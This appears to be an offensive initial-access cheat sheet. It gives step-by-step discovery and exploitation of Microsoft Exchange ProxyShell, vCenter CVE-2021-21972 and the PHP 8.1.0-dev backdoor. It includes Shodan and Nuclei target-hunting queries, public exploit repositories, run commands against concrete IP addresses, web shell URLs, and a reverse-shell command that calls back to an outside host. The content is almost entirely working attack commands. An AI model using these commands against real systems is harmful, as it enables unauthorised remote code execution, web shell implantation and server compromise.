# Exploit Public-Facing

Adversaries may attempt to take advantage of a weakness in an 
Internet-facing computer or program using software, data, or commands in
 order to cause unintended or unanticipated behavior.

### **CVE-2021-34473**

This vulnerability allows remote attackers to execute arbitrary code on 
affected installations of Microsoft Exchange Server. Authentication is 
not required to exploit this vulnerability.

#### Discovery

##### shodan

https://github.com/sansatart/scrapts/blob/master/shodan-favicon-hashes.csv

```
http.favicon.hash:1768726119  country:in
```

```
vuln:CVE-2021-34473
```

##### Nuclei

```
C:\Users\Administrator\nuclei-templates>nuclei -l ..\ips.txt -t nss\proxyshell.yaml
```

#### Exploit

```
git clone https://github.com/ktecv2000/ProxyShell
```

```
python exploit.py  103.102.101.100  administrator@example.com
```

##### Access web shell

```
https://103.102.101.100/aspnet_client/krnrvt.aspx
```

## CVE-2021-21972

The vSphere Client (HTML5) contains a remote code execution 
vulnerability in a vCenter Server plugin. A malicious actor with network
 access to port 443 may exploit this issue to execute commands with 
unrestricted privileges on the underlying operating system that hosts 
vCenter Server.

#### discovery

##### shodan

```
http.title:"ID_VC_Welcome"
```

##### Nuclei

```
C:\Users\Administrator\nuclei-templates>nuclei -l ..\urtl.txt cve:2021-21972
```

#### Exploit

https://github.com/horizon3ai/CVE-2021-21972

```
E:\Initial-Access\CVE-2021-21972>python CVE-2021-21972.py -t 213.214.215.216  -f nss.jsp -p ProgramData\\VMware\\vCenterServer\\data\\perfcharts\\tc-instance\\webapps\\statsreport\\nss.jsp -o win
```

##### Access web shell

```
https://213.154.80.121/statsreport/nss.jsp?go=netstat
```

### PHP 8.1.0 RCE

An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header

#### Discovery

###### censys

```
services.http.response.headers.x_powered_by: PHP/8.1.0-dev
```

###### shodan

```
PHP/8.1.0-dev
```

###### whatweb

```
whatweb http://130.185.123.176:8080
```

#### Exploit

https://github.com/flast101/php-8.1.0-dev-backdoor-rce

```
python3 rshell-php8.py http://130.185.123.176:8080 nooranetred.com 443
```